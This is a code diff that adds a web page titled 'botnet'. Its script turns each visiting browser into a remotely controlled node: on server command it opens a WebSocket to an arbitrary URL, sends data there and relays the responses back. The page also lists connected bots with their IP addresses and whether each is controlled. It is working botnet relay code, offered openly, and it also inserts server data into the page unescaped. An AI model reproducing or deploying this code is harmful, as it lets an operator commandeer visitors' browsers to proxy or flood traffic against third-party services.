@@ -1,0 +1,121 @@
+<html>
+
+<head>
+    <script src="/socket.io/socket.io.js"></script>
+    <title>botnet</title>
+</head>
+
+<body>
+  <h3>BOT NET</h3>
+    <div id="socketsBox">
+      <table class="sockets">
+            <tr class="sockets-tr">
+                <th>ID</th>
+                <th>IP</th>
+                <th>Controlled</th>
+            </tr>
+        <table id="sockets"></table>
+        </table>
+    </div>
+</body>
+<style>
+    #socketsBox{
+        padding: 10px;
+        background: #0009;
+        box-shadow: 0 0 9px #000;
+        border: 1px #fff6 solid;
+        text-align: center;
+        width: 500px;
+        margin: 0 auto;
+        text-align: center;
+    }
+	  td {
+        text-align: center;
+	  }
+  
+    .sockets-tr {
+        width: 25vw;
+    }
+
+    .sockets-tr > *{
+        width: 150px;
+        padding: 2px;
+        margin-left: 5px;
+        background: #0009;
+        border-radius: 3px;
+        border: 1px #fff6 solid;
+        margin-bottom: 2px;
+        position: relative;
+    }
+
+    html,
+    body {
+        background-color: rgb(27, 27, 27);
+        margin: 0; 
+        padding: 0;
+        text-align: center;
+        background-image: url("https://i.gifer.com/rkb.gif");
+        background-size:cover;
+    }
+
+    * {
+        color: white;
+        font-family: consolas;
+        text-shadow: 1px 1px #000;
+    }
+</style>
+<script>
+  	var socket = io();
+	let ws = null;
+
+	socket.on("con", (url, binaryType) => {
+		if(ws) {
+			ws.close();
+		};
+		ws = new WebSocket(url);
+		ws.binaryType = binaryType;
+		ws.onmessage = (data) => {
+			socket.emit("message", data.data);
+		};
+		ws.onclose = () => {
+			socket.emit("status", "close");
+		};
+		ws.onopen = () => {
+			socket.emit("status", "open");
+		};
+	});
+
+	socket.on("send", (data) => {
+		if(ws.readyState == 1) ws.send(data);
+		console.log(data);
+	});
+
+	socket.on("close", () => {
+		ws.close();
+		ws = null;
+	});
+	
+	socket.on('list', (sockets) => {
+	    document.getElementById('sockets').innerHTML = '';
+	    for(let i in sockets) {
+	        let table = document.createElement("tr");
+	
+	        table.innerHTML = `
+	        <td id="socket-${sockets[i].id}-id">${sockets[i].id}</td>
+	        <td id="socket-${sockets[i].id}-ip">${sockets[i].ip}</td>
+	        <td id="socket-${sockets[i].id}-controlled">${(sockets[i].controller !== 0) ? "✅" : "❌"}</td>`;
+	        table.id = 'socket-' + sockets[i].id;
+	        table.classList.add("sockets-tr")
+	        document.getElementById('sockets').appendChild(table);
+	    };
+	});
+
+	socket.on("disconnect", () => {
+		if(ws) {
+			ws.close();
+			ws = null;
+		};
+	});
+</script>
+
+</html>
